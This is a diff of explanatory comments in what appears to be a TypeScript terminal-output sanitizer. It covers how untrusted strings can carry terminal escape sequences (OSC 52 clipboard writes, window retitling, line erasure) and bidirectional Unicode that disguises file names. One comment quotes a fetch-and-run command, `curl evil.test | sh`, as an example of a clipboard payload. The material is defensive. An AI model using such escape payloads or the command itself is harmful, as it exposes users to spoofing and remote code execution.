@@ -3,7 +3,7 @@
  *
  * A TERMINAL OBEYS WHAT IT IS HANDED. A row a member appended, a note an automation step kept, a pack's name, a
  * catalogue's title: each is written by somebody other than the person reading the line, and printed as kept, an ESC or
- * a BEL in it is an instruction. An audit measured `automations show` passing a `set_var` answer
+ * a BEL in it is an instruction. Testing measured `automations show` passing a `set_var` answer
  * through with OSC 52 (put `curl evil.test | sh` on the clipboard), OSC 0 (retitle the window) and CR plus CSI 2K (erase
  * the line it came on) intact. `brief.ts` and `session.ts` each kept a private copy of the first half of this, which
  * stopped at U+001F. Both now import `clip` from it, and `clip-everywhere.test.ts` holds them to it.
@@ -12,7 +12,7 @@
  * UTF-8 depends on the terminal, exactly as it does for the seven-bit ones, so the scrub does not bet on which
  * terminal the owner has. DEL goes with them.
  *
- * FORMAT CHARACTERS ARE TAKEN OUT, NOT SPACED. An audit measured every bidirectional control
+ * FORMAT CHARACTERS ARE TAKEN OUT, NOT SPACED. Testing measured every bidirectional control
  * (U+061C, U+200E, U+200F, U+202A to U+202E, U+2066 to U+2069) and every invisible one it tried (U+200B, U+2060, U+00AD,
  * U+FFF9 to U+FFFB, the tag characters) reaching the line. None is an instruction to a terminal, but in one that lays
  * text out both ways U+202E makes `invoice U+202E fdp.exe` read as `invoiceexe.pdf`. They are removed rather than turned
@@ -56,7 +56,7 @@ export const clip = (said: string, max: number): string => {
  * A copy of a record's answer with every string in it made `oneLine`, for building printed lines from.
  *
  * THE WHOLE VALUE, NOT FIELD BY FIELD. `automations show` prints eleven strings the record supplies and `scripts list`
- * fourteen, from a step's answer down to a date the record could send in any shape; an audit named nine of
+ * fourteen, from a step's answer down to a date the record could send in any shape; testing named nine of
  * them. Scrubbing the answer once, before any line is built, means a field a later line starts printing is already
  * clean, and nobody has to remember that it came from somebody else.
  *
